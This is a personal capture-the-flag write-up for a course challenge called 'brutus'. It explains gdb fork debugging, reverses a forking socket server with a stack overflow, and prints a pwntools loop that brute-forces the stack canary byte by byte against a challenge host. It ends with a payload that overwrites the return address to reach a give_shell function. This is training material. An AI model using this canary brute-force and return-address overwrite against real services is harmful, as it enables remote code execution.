# canary\_brute\_force

## Debug fork in gdb

Debugging in this program is a little tricky, because parent process will recv message, and fork new process to process the message

{% embed url="https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html\#Inferiors-and-Programs" %}

{% embed url="http://sourceware.org/gdb/onlinedocs/gdb/Forks.html" %}

Inferiors in gdb is kinda like session or tab in vim. 

`info inferior` to list inferiors

`inferior 1` to go to process 

* two mode related: `detach-on-fork` and `follow-fork-mode`

if detach-on-fork is on\(default\), gdb follow child or parent according to follow-fork-mode, and drop the control of the other process.

if detach-on-fork is off, gdb takes one process\(according to follow-fork-mode\) to front end, and **hangs** the other process in other inferior at the point of fork.

 

> If you ask to debug a child process and a `vfork` is followed by an `exec`, GDB executes the new target up to the first breakpoint in the new target. If you have a breakpoint set on `main` in your original program, the breakpoint will also be set on the child process’s `main`.



### brutus

this is a simple example: parent call child to handle message after accept a socket

![](../.gitbook/assets/image%20%283%29.png)

![](../.gitbook/assets/image%20%281%29.png)

the only param `handle` needs is the fd of socket

```c
send(socket_fd, str.Hello, 0x29, 0) //0x29 means how many bytes to send
send(socket_fd, str.how_long, 0x1f, 0) //0 is just a flag not mattering
recv(socket_fd, ebp-0x90, 127, 0) //recv 127 bytes, stores it to eip-0x90
how_long_int = atoi(ebp-0x90)
memset(ebp-0x90, 0, 0x80) //0 is a flag, 0x80 is 128 bytes, ebp-0x90 used again
dprintf(socket_fd, str.give_me, how_long_int)
recv(socket_fd, ebp-0x90, how_long_int, 0 //write to memory cleaned by memset
```

at first, I thought how\_long\_int will be used to set how many bytes room will be set by memset. But actually the bytes set by memset is fixed, 

canary is at rbp-0x8, memory to write is rbp-0x90, 0x90-0x8 = 0x88

should take notice that len\('B'.rjust\(89,'A'\)\) == 89

When the handle child process return normally, it will send back "and goodbye". But when stack smashed, it won't. 

![](../.gitbook/assets/image%20%282%29.png)



use script below to brute for the canary of remote process



```python
for test_byte in range(0xff+1):  #0xff will not be test if not +1

    if REMOTE:
        sh = remote('offsec-chalbroker.osiris.cyber.nyu.edu',1340)
        sh.recv(1024)
        sh.send('cx578\n')
    else:
        sh = remote('127.0.0.1',8000)
    sh.recv(1024)
    sh.send(str(0x90))
    sh.recv(1024)

    test_answer = answer + chr(test_byte)
    print(binascii.hexlify(test_answer))
    payload = test_answer.rjust(0x88 + len(test_answer), 'A')
    sh.send(payload)
    response = sh.recvall()
    print(response)

    if 'goodbye' in response:
        return test_answer

```

and there's a give\_shell function, by using 

`payload = binascii.unhexlify('001a46c8500c09cf').rjust(0x90, 'A') + 'A'*8 + p64(0x00400afd)`

and sent it, easily got a shell.

